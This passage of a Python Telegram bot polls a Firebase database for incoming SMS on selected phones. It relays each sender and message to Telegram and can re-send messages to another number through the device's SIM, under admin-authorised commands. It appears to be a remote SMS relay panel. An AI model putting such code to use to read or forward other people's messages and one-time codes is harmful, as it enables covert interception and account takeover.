async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📱 *Firebase SMS Bot*\n\n"
        "Use the buttons below to control the bot.\n\n"
        "*Features:*\n"
        "• Choose SIM 1, SIM 2, or BOTH after selecting a device.\n"
        "• SMS sent via your choice.\n\n"
        "Use /setsim to change SIM later.",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keys = ["expecting_firebase_url", "expecting_firebase_secret", "expecting_device_id", 
            "expecting_manual_device_id", "expecting_channel"]
    for k in keys:
        context.user_data.pop(k, None)
    await update.message.reply_text("Operation cancelled.", reply_markup=get_main_keyboard())

# ---------------------------- Background Monitor ----------------------------
async def monitor_loop(application):
    while True:
        await asyncio.sleep(POLL_INTERVAL)
        now = time.time()
        for uid_str, user in list(user_data.items()):
            if uid_str == "authorized_admins":
                continue
            if not isinstance(user, dict):
                continue
            if not user.get("monitor_active"):
                continue
            if not user.get("firebase_url") or not user.get("secret") or not user.get("device_id"):
                continue
            last_seen = user.get("last_seen_time", 0)
            if now - last_seen > AUTO_PAUSE_MINUTES * 60:
                user["monitor_active"] = False
                save_user(uid_str, user)
                try:
                    await application.bot.send_message(
                        int(uid_str),
                        "⏸ *Monitor auto-paused*\n\nNo new incoming SMS for 5 minutes.\n\n"
                        "• /resumemonitor — continue\n"
                        "• /startmonitor — restart",
                        parse_mode="Markdown",
                        reply_markup=get_main_keyboard()
                    )
                except Exception:
                    pass
                continue
            after_key = user.get("last_message_key", "")
            try:
                new_msgs = await fetch_new_messages(user["firebase_url"], user["secret"], user["device_id"], after_key)
            except Exception as e:
                logger.error(f"Fetch error for {uid_str}: {e}")
                continue
            if new_msgs:
                last_key = new_msgs[-1][0]
                user["last_message_key"] = last_key
                user["last_seen_time"] = now
                save_user(uid_str, user)
                for key, msg in new_msgs:
                    text = msg.get("message") or msg.get("text") or msg.get("body") or ""
                    sender = msg.get("sender") or msg.get("from") or "Unknown"
                    fmt_choice = user.get("response_format", "new")
                    forward_text = format_sms_notification(sender, text, fmt_choice)
                    try:
                        await application.bot.send_message(int(uid_str), forward_text, parse_mode="Markdown")
                    except Exception:
                        pass
                    forward_num = user.get("forward_number")
                    if forward_num:
                        try:
                            success, error = await send_sms_with_sim_choice(user, forward_num, f"Forwarded from {sender}: {text}")
                            if success > 0:
                                await application.bot.send_message(int(uid_str), f"✅ Forwarded to {forward_num}")
                            else:
                                await application.bot.send_message(int(uid_str), f"❌ Forward failed: {error}")
                        except Exception as e:
                            await application.bot.send_message(int(uid_str), f"❌ Forward failed: {str(e)}")

# ---------------------------- Main ------------------------------------------
def main():
    application = Application.builder().token(TOKEN).build()
    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("setfirebase", setfirebase))
    application.add_handler(CommandHandler("setdevice", setdevice))
    application.add_handler(CommandHandler("setchannel", setchannel))
    application.add_handler(CommandHandler("setforward", setforward))
    application.add_handler(CommandHandler("setsim", setsim))
    application.add_handler(CommandHandler("setformat", setformat))
    application.add_handler(CommandHandler("startmonitor", startmonitor))
    application.add_handler(CommandHandler("stopmonitor", stopmonitor))
    application.add_handler(CommandHandler("resumemonitor", resumemonitor))
    application.add_handler(CommandHandler("monitorstatus", monitorstatus))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("test", test))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("edit_device", edit_device))
    # Admin commands
    application.add_handler(CommandHandler("authorize", authorize))
    application.add_handler(CommandHandler("unauthorize", unauthorize))
    application.add_handler(CommandHandler("admins", admins))
    application.add_handler(CommandHandler("adminpanel", adminpanel))
    # Callback handlers
    application.add_handler(CallbackQueryHandler(device_selection_callback, pattern="^dev_"))
    application.add_handler(CallbackQueryHandler(sim_selection_callback, pattern="^sim_"))
    application.add_handler(CallbackQueryHandler(format_selection_callback, pattern="^fmt_"))
    # Message handlers
    application.add_handler(MessageHandler(filters.ChatType.PRIVATE & filters.TEXT & ~filters.COMMAND, text_router))
    application.add_handler(MessageHandler(filters.ChatType.CHANNEL, handle_channel_post))
    application.add_handler(MessageHandler(filters.ChatType.GROUPS, handle_channel_post))
    application.run_polling()

if __name__ == "__main__":
    main()
